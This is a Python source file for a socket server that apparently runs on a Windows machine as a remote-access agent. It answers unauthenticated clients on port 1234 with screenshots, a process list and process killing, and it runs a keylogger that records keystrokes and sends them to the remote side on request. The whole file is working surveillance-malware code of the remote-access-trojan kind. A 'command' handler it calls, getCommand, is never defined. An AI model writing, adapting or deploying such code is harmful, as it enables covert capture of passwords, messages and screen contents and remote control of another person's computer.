import socket
import pickle
from boltons import socketutils
from pynput import keyboard
from PIL import ImageGrab
import os
import wmi
import threading

SERVER = ""
PORT = 1234

class ServerServices:
    def __init__(self):
        self.clients = list()
        self.server = None
        self.server_thread = None

    def startServices(self):
        print('START SERVER')
        self.createSocket()
        self.server_thread = threading.Thread(target = self.addConnection)
        self.server_thread.start()

    def stopServices(self):
        print('STOP SERVER')
        for client in self.clients:
            if client.conn != None:
                client.closeConnection()

        self.server.close()
        self.server = None

        self.server_thread.join()


    # create socket
    def createSocket(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((SERVER, PORT))
                               
        print(f"Port: {PORT}")
        self.server.listen()

    def addConnection(self):
        while True:
            try:
                conn, addr = self.server.accept()

                client = Client(conn, addr)
                client.startConnection()
                self.clients.append(client)

            except:
                if self.server == None:
                    print('Server stopped. Exit thread')
                else:
                    print('Unexpected error')
                    self.stopServices()
                break
            
    
    

class Client:
    def __init__(self, conn, addr):
        self.buff = None
        self.conn = conn
        self.addr = addr
        self.client_thread = None
        self.DELIM = b'\x00'

    def startConnection(self):
        print(f'{self.addr} \tSTART CONNECTION')
        self.buff = socketutils.BufferedSocket(self.conn, None)
        self.client_thread = threading.Thread(target = self.services)
        self.client_thread.start()

    #close connection
    def closeConnection(self):
        print(f'{self.addr} \tCLOSE CONNECTION')

        self.conn.close()
        self.conn = None

        self.client_thread.join()

    def services(self):
        while True:
            try:
                flag = self.buff.recv_until(b'!F!').decode()
                print(f'{self.addr} \tReceive: {flag}')
                
                if flag == 'screenshot':
                    self.sendScreenShot()
                elif flag == 'processlist':
                    self.sendProcessList()
                elif flag == 'killprocess':
                    self.getKillProcess()
                elif flag == 'command':
                    self.getCommand()
                elif flag == 'keylogger':
                    self.keylogger_Server()
                elif flag == 'close':
                    self.closeConnection()
            except:
                if self.conn == None:
                    print(f'{self.addr} \tClient closed. Exit thread')
                else:
                    print(f'{self.addr} \tUnexpected error')
                    self.closeConnection()
                break

    # dump func
    def sendDump(self, var):
        dump = pickle.dumps(var)
        dump_size = len(dump)

        self.buff.send(str(dump_size).encode() + self.DELIM)
        self.buff.send(dump)
        print(f'{self.addr} \tSent dump data. Size: {dump_size}')

    #  screenshot func
    def sendScreenShot(self):
        print(f'{self.addr} \tSEND SCREENSHOT')
        image = ImageGrab.grab()
        
        self.sendDump(image)

    # keylogger func
    def keylogger_Server(self):
        def on_press(key):
            nonlocal string
            try:
                string += key.char
            except AttributeError:
                _key = str(key).split('.')[1].upper()

                if _key == 'ENTER':
                    string += f'[{_key}]\n'
                # elif _key == 'SPACE':
                #     string += ' '
                # elif _key == 'BACKSPACE':
                #     string = string[:-1]
                else:
                    string += f'[{_key}]'

        print('KEYLOGGER FUNCTION')
        string = ''
        isHook = False

        while True:
            flag = self.buff.recv_until(self.DELIM).decode()
            print(f'\tReceive: {flag}')
            
            if flag == 'hook' and not isHook:
                listener = keyboard.Listener(on_press = on_press)
                listener.start()
                isHook = True
            elif flag == 'unhook' and isHook:
                listener.stop()
                isHook = False
            elif flag == 'clear':
                string = ''
            elif flag == 'send':
                self.buff.send(string.encode() + self.DELIM)
            elif flag == 'exit':
                if isHook:
                    listener.stop()
                break
            
    # kill process func
    def getKillProcess(self):
        pid = int(self.buff.recv_until(self.DELIM).decode())
        print(f'KILL PROCESS {pid}')

        try:
            os.kill(pid, 9)
        except:
            print('\t Err: No process with uid exist')

    # process list func
    def sendProcessList(self):
        print('SEND PROCESS LIST')
        f = wmi.WMI()

        process_data = []
        for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
            process_data.append([process.ProcessId, process.Name, process.ThreadCount])

        self.sendDump(process_data)
